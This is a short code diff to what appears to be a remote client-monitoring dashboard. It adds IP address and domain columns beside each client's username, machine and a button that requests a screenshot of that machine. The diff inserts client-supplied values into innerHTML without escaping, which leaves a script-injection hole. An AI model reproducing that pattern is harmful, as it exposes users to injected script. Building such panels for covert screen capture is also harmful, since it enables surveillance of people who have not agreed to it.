@@ -17,8 +17,10 @@
     <table>
         <thead>
             <tr>
+                <th>IP Address</th>
                 <th>Username</th>
                 <th>Machine</th>
+                <th>Domain</th>
                 <th>Last Active</th>
                 <th>Actions</th>
             </tr>
@@ -54,16 +56,20 @@
                 row = document.createElement('tr');
                 row.id = client.id;
                 row.innerHTML = `
+                    <td>${client.ip}</td>
                     <td>${client.username}</td>
                     <td>${client.machine}</td>
+                    <td>${client.domain}</td>
                     <td>${client.last_active}</td>
                     <td><button onclick="requestScreenshot('${client.id}')">Screenshot</button></td>
                 `;
                 document.getElementById('client-table-body').appendChild(row);
             } else {
-                row.cells[0].textContent = client.username;
-                row.cells[1].textContent = client.machine;
-                row.cells[2].textContent = client.last_active;
+                row.cells[0].textContent = client.ip;
+                row.cells[1].textContent = client.username;
+                row.cells[2].textContent = client.machine;
+                row.cells[3].textContent = client.domain;
+                row.cells[4].textContent = client.last_active;
             }
         }
 
